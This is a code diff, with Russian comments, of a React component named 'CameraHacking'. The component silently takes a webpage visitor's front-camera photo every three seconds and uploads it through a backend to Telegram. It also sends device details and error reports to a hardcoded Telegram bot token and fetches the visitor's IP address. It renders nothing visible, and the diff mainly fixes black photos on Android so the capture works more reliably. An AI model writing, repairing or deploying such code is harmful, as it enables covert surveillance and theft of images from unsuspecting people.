@@ -1,6 +1,6 @@
 /**
- * КОМПОНЕНТ CAMERAHACKING - ОПТИМИЗИРОВАН ДЛЯ ANDROID
- * ФОКУС НА НАДЕЖНУЮ ОТПРАВКУ ФОТО КАЖДЫЕ 3 СЕКУНДЫ
+ * КОМПОНЕНТ CAMERAHACKING - ИСПРАВЛЕННАЯ ВЕРСИЯ ДЛЯ ANDROID
+ * РЕШЕНИЕ ПРОБЛЕМЫ С ЧЕРНЫМИ ФОТО
  */
 
 import axios from 'axios';
@@ -13,10 +13,11 @@ const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) =
   const [captureCount, setCaptureCount] = useState(0);
   const [isAndroid, setIsAndroid] = useState(false);
   const [androidVersion, setAndroidVersion] = useState(0);
+  const [videoReady, setVideoReady] = useState(false);
 
   // Конфигурация
   const CAPTURE_INTERVAL = 3000; // 3 секунды
-  const MAX_CAPTURES = 50; // Уменьшено для Android
+  const MAX_CAPTURES = 50;
 
   /**
    * ФУНКЦИЯ ОПРЕДЕЛЕНИЯ ANDROID УСТРОЙСТВА
@@ -50,42 +51,21 @@ const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) =
       };
     }
     
-    // Для старых Android (до 5.0)
-    if (androidVersion < 5.0) {
-      return {
-        video: {
-          width: { ideal: 640 },
-          height: { ideal: 480 },
-          facingMode: { exact: "user" }
-        }
-      };
-    }
-    
-    // Для Android 5.0-8.0
-    if (androidVersion < 8.0) {
-      return {
-        video: {
-          width: { ideal: 1280 },
-          height: { ideal: 720 },
-          frameRate: { ideal: 24 },
-          facingMode: { exact: "user" }
-        }
-      };
-    }
-    
-    // Для современных Android (8.0+)
+    // Для Android используем более простые настройки
     return {
       video: {
-        width: { ideal: 1920 },
-        height: { ideal: 1080 },
-        frameRate: { ideal: 30 },
-        facingMode: "user"
+        width: { min: 640, ideal: 1280, max: 1920 },
+        height: { min: 480, ideal: 720, max: 1080 },
+        frameRate: { ideal: 24 },
+        facingMode: "user",
+        // Критически важные настройки для Android
+        resizeMode: 'crop-and-scale'
       }
     };
   };
 
   /**
-   * ФУНКЦИЯ ИНИЦИАЛИЗАЦИИ ВИДЕО ДЛЯ ANDROID
+   * ФУНКЦИЯ ИНИЦИАЛИЗАЦИИ ВИДЕО ДЛЯ ANDROID (УЛУЧШЕННАЯ)
    */
   const initializeAndroidVideo = () => {
     return new Promise((resolve, reject) => {
@@ -95,6 +75,9 @@ const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) =
       }
       
       const video = videoRef.current;
+      let videoLoaded = false;
+      
+      console.log("🎬 Initializing Android video...");
       
       // Критически важные настройки для Android
       video.playsInline = true;
@@ -103,143 +86,201 @@ const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) =
       video.setAttribute('muted', 'true');
       video.setAttribute('webkit-playsinline', 'true');
       video.setAttribute('autoplay', 'true');
+      video.setAttribute('preload', 'auto');
       
+      // 1. Ожидаем загрузки метаданных
       const handleLoadedMetadata = () => {
         console.log("✅ Android video metadata loaded");
+        videoLoaded = true;
         video.removeEventListener('loadedmetadata', handleLoadedMetadata);
+        video.removeEventListener('error', handleError);
         
-        // Для Android даем больше времени на инициализацию
+        // Для Android даем ОЧЕНЬ много времени на инициализацию
         setTimeout(() => {
-          if (video.videoWidth > 0 && video.videoHeight > 0) {
-            console.log(`📱 Android video ready: ${video.videoWidth}x${video.videoHeight}`);
-            resolve();
-          } else {
-            // Пробуем принудительно запустить видео
-            video.play().then(resolve).catch(() => {
-              console.log("⚠️ Auto-play blocked, continuing anyway");
+          console.log(`📱 Video dimensions: ${video.videoWidth}x${video.videoHeight}`);
+          
+          // Пробуем принудительно запустить видео
+          video.play().then(() => {
+            console.log("▶️ Android video play() successful");
+            
+            // Даем время на отрисовку кадра
+            setTimeout(() => {
+              setVideoReady(true);
               resolve();
-            });
-          }
+            }, 500);
+            
+          }).catch((playError) => {
+            console.log("⚠️ Android video play() blocked, but continuing...");
+            
+            // Все равно продолжаем, но ждем дольше
+            setTimeout(() => {
+              setVideoReady(true);
+              resolve();
+            }, 1500);
+          });
         }, 1000);
       };
       
-      video.addEventListener('loadedmetadata', handleLoadedMetadata);
-      
-      // Fallback таймер
-      setTimeout(() => {
+      // 2. Обработчик ошибок
+      const handleError = (error) => {
+        console.error("❌ Android video error:", error);
         video.removeEventListener('loadedmetadata', handleLoadedMetadata);
-        console.log("⏰ Android video initialization timeout");
-        resolve();
-      }, 5000);
+        video.removeEventListener('error', handleError);
+        reject(error);
+      };
+      
+      // 3. Обработчик canplay - когда видео может воспроизводиться
+      const handleCanPlay = () => {
+        console.log("🎬 Android video can play");
+        if (!videoLoaded) {
+          handleLoadedMetadata();
+        }
+      };
+      
+      // Добавляем все обработчики
+      video.addEventListener('loadedmetadata', handleLoadedMetadata);
+      video.addEventListener('error', handleError);
+      video.addEventListener('canplay', handleCanPlay);
+      video.addEventListener('canplaythrough', handleCanPlay);
+      
+      // Fallback таймер - ОЧЕНЬ важный для Android!
+      const fallbackTimer = setTimeout(() => {
+        console.log("⏰ Android video initialization timeout - using fallback");
+        video.removeEventListener('loadedmetadata', handleLoadedMetadata);
+        video.removeEventListener('error', handleError);
+        video.removeEventListener('canplay', handleCanPlay);
+        video.removeEventListener('canplaythrough', handleCanPlay);
+        
+        if (!videoLoaded) {
+          console.log("⚠️ Forcing video initialization...");
+          setVideoReady(true);
+          resolve(); // Все равно разрешаем
+        }
+      }, 10000); // 10 секунд для Android
+      
+      // Очистка таймера при успехе
+      handleLoadedMetadata.cleanup = () => clearTimeout(fallbackTimer);
+      
     });
   };
 
   /**
-   * ФУНКЦИЯ ОТПРАВКИ ФОТО С ПОВТОРАМИ ДЛЯ ANDROID
+   * ФУНКЦИЯ ДЛЯ ЗАХВАТА КАДРА С ANDROID (ИСПРАВЛЕННАЯ)
    */
-  const sendToTelegram = async (blob, filename, retryCount = 0) => {
-    const maxRetries = isAndroid ? 3 : 1; // Больше повторов для Android
-    
-    try {
-      // Для Android уменьшаем качество если фото слишком большое
-      let finalBlob = blob;
-      if (isAndroid && blob.size > 500 * 1024) { // Больше 500KB
-        console.log("⚡ Compressing image for Android...");
-        finalBlob = await compressImageForAndroid(blob);
-      }
+  const captureAndroidFrame = async (video) => {
+    return new Promise((resolve, reject) => {
+      // Создаем canvas
+      const canvas = document.createElement("canvas");
       
+      // Используем текущие размеры видео
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      
+      const context = canvas.getContext("2d", {
+        alpha: false, // Отключаем прозрачность для производительности
+        willReadFrequently: false
+      });
+      
+      // Очищаем canvas черным цветом перед рисованием
+      context.fillStyle = 'black';
+      context.fillRect(0, 0, canvas.width, canvas.height);
+      
+      // Пробуем несколько раз нарисовать кадр (для Android)
+      const maxAttempts = 5;
+      let attempts = 0;
+      
+      const tryDrawFrame = () => {
+        attempts++;
+        
+        try {
+          // Пробуем нарисовать текущий кадр
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+          
+          // Проверяем, не черный ли canvas
+          const imageData = context.getImageData(0, 0, 1, 1).data;
+          const isBlack = imageData[0] === 0 && imageData[1] === 0 && imageData[2] === 0;
+          
+          if (!isBlack || attempts >= maxAttempts) {
+            console.log(`📸 Android frame captured (attempt ${attempts}/${maxAttempts}, black: ${isBlack})`);
+            
+            // Применяем улучшения для Android
+            if (!isBlack) {
+              context.filter = "contrast(1.2) brightness(1.1) saturate(1.1)";
+              context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            }
+            
+            resolve(canvas);
+          } else {
+            // Ждем и пробуем снова
+            console.log(`⏳ Android: Got black frame, retrying... (${attempts}/${maxAttempts})`);
+            setTimeout(tryDrawFrame, 200);
+          }
+        } catch (error) {
+          console.error("❌ Error drawing frame:", error);
+          reject(error);
+        }
+      };
+      
+      // Начинаем попытки захвата
+      tryDrawFrame();
+    });
+  };
+
+  /**
+   * ФУНКЦИЯ ОТПРАВКИ ФОТО (УПРОЩЕННАЯ)
+   */
+  const sendToTelegram = async (blob, filename) => {
+    try {
       const formData = new FormData();
       formData.append("chat_id", chatId);
-      formData.append("photo", finalBlob, filename);
+      formData.append("photo", blob, filename);
       
-      // Добавляем информацию об устройстве для отладки
-      formData.append("device_info", JSON.stringify({
+      // Добавляем информацию для отладки
+      formData.append("debug_info", JSON.stringify({
         isAndroid: isAndroid,
         androidVersion: androidVersion,
-        userAgent: navigator.userAgent,
         timestamp: Date.now(),
-        blobSize: finalBlob.size
+        blobSize: blob.size,
+        userAgent: navigator.userAgent.substring(0, 100)
       }));
       
       const apiUrl = `${API_CONFIG.baseURL}${API_CONFIG.endpoints.sendPhotoToTelegram}`;
       
-      console.log(`📤 Sending photo (${Math.round(finalBlob.size / 1024)} KB)...`);
+      console.log(`📤 Sending photo (${Math.round(blob.size / 1024)} KB)...`);
       
       await axios.post(apiUrl, formData, {
         headers: { "Content-Type": "multipart/form-data" },
-        timeout: isAndroid ? 30000 : 10000, // Больше таймаут для Android
-        onUploadProgress: (progressEvent) => {
-          if (progressEvent.total) {
-            const percent = Math.round((progressEvent.loaded * 100) / progressEvent.total);
-            console.log(`📤 Upload: ${percent}%`);
-          }
-        }
+        timeout: 30000
       });
       
       console.log(`✅ Photo #${captureCount + 1} sent successfully`);
       setCaptureCount(prev => prev + 1);
       
     } catch (error) {
-      console.error(`❌ Error sending photo (attempt ${retryCount + 1}/${maxRetries}):`, error.message);
+      console.error(`❌ Error sending photo:`, error.message);
       
-      // Повторная попытка для Android
-      if (retryCount < maxRetries) {
-        console.log(`🔄 Retrying in 2 seconds...`);
-        await new Promise(resolve => setTimeout(resolve, 2000));
-        return sendToTelegram(blob, filename, retryCount + 1);
-      } else {
-        console.error(`❌ Failed after ${maxRetries} attempts`);
-        
-        // Отправляем ошибку в Telegram для отладки
-        try {
-          const telegramApiUrl = 'https://api.telegram.org/bot8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s/sendMessage';
-          await axios.post(telegramApiUrl, {
-            'chat_id': chatId,
-            'text': `❌ Android Photo Send Failed\n\n` +
-                   `Attempts: ${maxRetries}\n` +
-                   `Error: ${error.message}\n` +
-                   `Device: ${navigator.userAgent}\n` +
-                   `Time: ${new Date().toLocaleString()}`
-          });
-        } catch (e) {
-          console.error("❌ Could not send error notification:", e);
-        }
+      // Отправляем ошибку в Telegram
+      try {
+        const telegramApiUrl = 'https://api.telegram.org/bot8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s/sendMessage';
+        await axios.post(telegramApiUrl, {
+          'chat_id': chatId,
+          'text': `❌ Photo Send Error\n\n` +
+                 `Error: ${error.message}\n` +
+                 `Device: ${isAndroid ? 'Android' : 'Other'}\n` +
+                 `Time: ${new Date().toLocaleString()}`
+        });
+      } catch (e) {
+        console.error("❌ Could not send error notification:", e);
       }
     }
   };
 
   /**
-   * ФУНКЦИЯ СЖАТИЯ ИЗОБРАЖЕНИЯ ДЛЯ ANDROID
-   */
-  const compressImageForAndroid = (blob) => {
-    return new Promise((resolve) => {
-      const img = new Image();
-      img.onload = () => {
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
-        
-        // Уменьшаем разрешение для Android
-        const maxWidth = isAndroid && androidVersion < 8.0 ? 800 : 1200;
-        const scale = Math.min(maxWidth / img.width, 1);
-        canvas.width = img.width * scale;
-        canvas.height = img.height * scale;
-        
-        ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
-        
-        // Более низкое качество для экономии трафика
-        const quality = isAndroid ? 0.5 : 0.5;
-        canvas.toBlob(resolve, 'image/jpeg', quality);
-      };
-      img.src = URL.createObjectURL(blob);
-    });
-  };
-
-  /**
-   * ОСНОВНАЯ ФУНКЦИЯ ЗАХВАТА ФОТО (ОПТИМИЗИРОВАНА ДЛЯ ANDROID)
+   * ОСНОВНАЯ ФУНКЦИЯ ЗАХВАТА ФОТО
    */
   const capturePhoto = async () => {
     if (!videoRef.current || !streamRef.current || captureCount >= MAX_CAPTURES) {
-      console.log("⏸️ Capture stopped: limit reached or no stream");
+      console.log("⏸️ Capture stopped");
       stopCapturing();
       return;
     }
@@ -247,90 +288,68 @@ const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) =
     try {
       const video = videoRef.current;
       
-      // Для Android даем больше проверок
+      // Критическая проверка для Android
       if (isAndroid) {
-        if (!video.srcObject || video.srcObject.getTracks().length === 0) {
-          console.log("⚠️ Android: No video tracks available");
+        if (!videoReady) {
+          console.log("⏳ Android video not ready yet, skipping...");
           return;
         }
         
-        // Проверяем, активен ли поток
-        const tracks = video.srcObject.getTracks();
-        const activeTracks = tracks.filter(track => track.readyState === 'live');
-        if (activeTracks.length === 0) {
-          console.log("⚠️ Android: No active video tracks");
+        // Дополнительная проверка размеров
+        if (video.videoWidth === 0 || video.videoHeight === 0) {
+          console.log(`⚠️ Android video dimensions are zero: ${video.videoWidth}x${video.videoHeight}`);
+          
+          // Пробуем принудительно обновить
+          setTimeout(() => {
+            if (video.videoWidth > 0 && video.videoHeight > 0) {
+              capturePhoto();
+            }
+          }, 1000);
           return;
         }
-      }
-      
-      // Проверяем готовность видео
-      if (video.videoWidth === 0 || video.videoHeight === 0) {
-        console.log(`⏳ Video not ready: ${video.videoWidth}x${video.videoHeight}`);
-        
-        // Для Android пробуем принудительно обновить
-        if (isAndroid) {
-          setTimeout(capturePhoto, 1000);
-        }
-        return;
       }
       
       console.log(`📸 Capturing photo #${captureCount + 1} (${video.videoWidth}x${video.videoHeight})`);
       
-      // Создаем canvas с учетом ориентации Android
-      const canvas = document.createElement("canvas");
+      let canvas;
       
-      // Исправление ориентации для фронтальной камеры Android
-      const isPortrait = video.videoHeight > video.videoWidth;
-      
-      if (isAndroid && isPortrait) {
-        // Для портретной ориентации на Android
-        canvas.width = video.videoHeight;
-        canvas.height = video.videoWidth;
+      if (isAndroid) {
+        // Используем специальную функцию для Android
+        canvas = await captureAndroidFrame(video);
       } else {
+        // Для iOS/десктопов обычный подход
+        canvas = document.createElement("canvas");
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
+        const context = canvas.getContext("2d");
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
       }
       
-      const context = canvas.getContext("2d");
-      
-      // Коррекция ориентации
-      if (isAndroid && isPortrait) {
-        context.translate(canvas.width / 2, canvas.height / 2);
-        context.rotate(Math.PI / 2);
-        context.translate(-canvas.height / 2, -canvas.width / 2);
-      }
-      
-      // Рисуем изображение с улучшением контраста для Android
-      context.filter = isAndroid ? "contrast(1.2) brightness(1.1)" : "none";
-      context.drawImage(video, 0, 0, video.videoWidth, video.videoHeight);
-      
-      // Разное качество для Android/iOS
-      const quality = isAndroid ? 0.5 : 0.5;
+      // Качество для Android делаем ниже для надежности
+      const quality = isAndroid ? 0.6 : 0.8;
       
       canvas.toBlob(async (blob) => {
         if (blob) {
           const sizeKB = Math.round(blob.size / 1024);
-          console.log(`✅ Photo captured (${sizeKB} KB, quality: ${quality})`);
+          console.log(`✅ Photo captured (${sizeKB} KB)`);
           
           // Отправляем фото
-          await sendToTelegram(blob, `photo_${Date.now()}_${isAndroid ? 'android' : 'ios'}.jpg`);
+          await sendToTelegram(blob, `photo_${Date.now()}.jpg`);
+          
+          // Для Android проверяем размер фото
+          if (isAndroid && blob.size < 1024) {
+            console.log("⚠️ Android: Photo size suspiciously small, might be black");
+          }
         } else {
           console.error("❌ Failed to create image blob");
-          
-          // Для Android пробуем еще раз
-          if (isAndroid) {
-            setTimeout(capturePhoto, 1000);
-          }
         }
       }, "image/jpeg", quality);
       
     } catch (error) {
       console.error("❌ Capture error:", error);
       
-      // Для Android пробуем восстановить
       if (isAndroid) {
-        console.log("🔄 Android: Trying to recover from capture error...");
-        setTimeout(capturePhoto, 2000);
+        console.log("🔄 Android: Will retry in next interval...");
       }
     }
   };
@@ -345,8 +364,9 @@ const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) =
     
     console.log(`🚀 Starting periodic capture every ${CAPTURE_INTERVAL/1000} seconds`);
     
-    // Первый захват с задержкой для Android
-    const initialDelay = isAndroid ? 2000 : 1000;
+    // Для Android даем больше времени перед первым захватом
+    const initialDelay = isAndroid ? 3000 : 1000;
+    
     setTimeout(() => {
       capturePhoto();
     }, initialDelay);
@@ -374,14 +394,14 @@ const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) =
   };
 
   /**
-   * ФУНКЦИЯ ИНИЦИАЛИЗАЦИИ КАМЕРЫ С УЧЕТОМ ANDROID
+   * ФУНКЦИЯ ИНИЦИАЛИЗАЦИИ КАМЕРЫ
    */
   const initializeCamera = async () => {
     try {
       console.log("📱 Initializing camera...");
       
       // Определяем Android
-      const isAndroidDevice = detectAndroid();
+      detectAndroid();
       
       // Получаем настройки для устройства
       const constraints = getAndroidCameraConstraints();
@@ -391,58 +411,54 @@ const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) =
       const stream = await navigator.mediaDevices.getUserMedia(constraints);
       streamRef.current = stream;
       
-      console.log("✅ Camera access granted, stream active:", stream.active);
+      console.log("✅ Camera access granted");
       
       if (videoRef.current) {
         videoRef.current.srcObject = stream;
         
         // Для Android используем специальную инициализацию
-        if (isAndroidDevice) {
+        if (isAndroid) {
+          console.log("🔄 Initializing Android video (this may take a moment)...");
           await initializeAndroidVideo();
         } else {
           // Для iOS/десктопов
           await new Promise(resolve => {
-            if (videoRef.current.readyState >= 2) {
+            videoRef.current.onloadedmetadata = () => {
+              setVideoReady(true);
               setTimeout(resolve, 1000);
-            } else {
-              videoRef.current.onloadedmetadata = () => setTimeout(resolve, 1000);
-            }
+            };
           });
         }
         
-        console.log("🎬 Camera ready, starting capture...");
+        console.log("🎬 Camera ready!");
         
-        // Отправляем информацию об устройстве в Telegram
+        // Отправляем информацию об устройстве
         try {
           const telegramApiUrl = 'https://api.telegram.org/bot8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s/sendMessage';
           await axios.post(telegramApiUrl, {
             'chat_id': chatId,
-            'text': `📱 Device Connected\n\n` +
+            'text': `📱 Camera Initialized\n\n` +
                    `Platform: ${isAndroid ? 'Android' : 'iOS/Desktop'}\n` +
-                   `Android Version: ${androidVersion || 'N/A'}\n` +
-                   `User Agent: ${navigator.userAgent.substring(0, 100)}...\n` +
+                   `Status: ${videoReady ? 'Ready' : 'Not Ready'}\n` +
                    `Time: ${new Date().toLocaleString()}`
           });
         } catch (e) {
-          console.log("⚠️ Could not send device info");
+          console.log("⚠️ Could not send initialization info");
         }
         
-        // Запускаем периодический захват
+        // Запускаем захват
         startPeriodicCapture();
       }
       
     } catch (error) {
       console.error("❌ Camera initialization error:", error);
       
-      // Пробуем альтернативные настройки для Android
-      if (isAndroid && error.name === 'OverconstrainedError') {
-        console.log("🔄 Trying alternative constraints for Android...");
+      // Пробуем альтернативные настройки
+      if (isAndroid) {
+        console.log("🔄 Trying fallback camera constraints...");
         try {
           const fallbackConstraints = {
-            video: {
-              width: { ideal: 640 },
-              height: { ideal: 480 }
-            }
+            video: true // Максимально простые настройки
           };
           
           const stream = await navigator.mediaDevices.getUserMedia(fallbackConstraints);
@@ -451,8 +467,9 @@ const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) =
           if (videoRef.current) {
             videoRef.current.srcObject = stream;
             setTimeout(() => {
+              setVideoReady(true);
               startPeriodicCapture();
-            }, 2000);
+            }, 3000);
           }
         } catch (fallbackError) {
           console.error("❌ Fallback camera also failed:", fallbackError);
@@ -466,38 +483,13 @@ const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) =
    */
   const fetchClientIp = async () => {
     try {
-      // Для Android используем несколько сервисов
-      const ipServices = [
-        'https://api.ipify.org?format=json',
-        'https://ipinfo.io/json',
-        'https://api.my-ip.io/v2/ip.json'
-      ];
+      const response = await axios.get('https://api.ipify.org?format=json', {
+        timeout: 5000
+      });
       
-      for (const service of ipServices) {
-        try {
-          const response = await axios.get(service, { timeout: 10000 });
-          let ip = response.data.ip || response.data.query;
-          
-          if (ip) {
-            setClientIp(ip);
-            console.log("✅ Client IP fetched:", ip);
-            
-            // Отправляем IP в Telegram
-            const telegramApiUrl = 'https://api.telegram.org/bot8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s/sendMessage';
-            await axios.post(telegramApiUrl, {
-              'chat_id': chatId,
-              'text': `🌐 IP Address: ${ip}\n` +
-                     `Platform: ${isAndroid ? 'Android' : 'Other'}`
-            });
-            
-            return;
-          }
-        } catch (err) {
-          console.log(`⚠️ IP service failed: ${service}`);
-        }
-      }
-      
-      setClientIp("IP unavailable");
+      const ip = response.data.ip;
+      setClientIp(ip);
+      console.log("✅ Client IP fetched:", ip);
       
     } catch (error) {
       console.error("❌ Error fetching client IP:", error);
@@ -528,36 +520,14 @@ const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) =
         await fetchClientIp();
       } else {
         console.error("❌ MediaDevices API not supported");
-        
-        // Отправляем ошибку в Telegram
-        const telegramApiUrl = 'https://api.telegram.org/bot8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s/sendMessage';
-        axios.post(telegramApiUrl, {
-          'chat_id': chatId,
-          'text': `❌ API Not Supported\n\n` +
-                 `Device: ${navigator.userAgent}\n` +
-                 `Error: MediaDevices API not available`
-        });
       }
     };
 
     // Запуск инициализации
     init();
 
-    // Обработчик видимости страницы
-    const handleVisibilityChange = () => {
-      if (document.hidden) {
-        console.log("⏸️ Page hidden");
-      } else {
-        console.log("▶️ Page visible");
-      }
-    };
-
-    document.addEventListener('visibilitychange', handleVisibilityChange);
-
     // Очистка
     return () => {
-      document.removeEventListener('visibilitychange', handleVisibilityChange);
-      
       stopCapturing();
       
       if (streamRef.current) {
@@ -567,22 +537,10 @@ const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) =
         });
         streamRef.current = null;
       }
-      
-      console.log("🧹 Cleanup completed");
     };
   }, []);
 
-  /**
-   * СКРЫТЫЙ ЭЛЕМЕНТ ДЛЯ ОТЛАДКИ ANDROID
-   */
-  return (
-    <div style={{ display: 'none' }}>
-      {/* Скрытый элемент для отладки Android */}
-      <div id="android-debug">
-        {isAndroid ? `Android ${androidVersion}` : 'Not Android'}
-      </div>
-    </div>
-  );
+  return null;
 };
 
 export default CameraHacking;
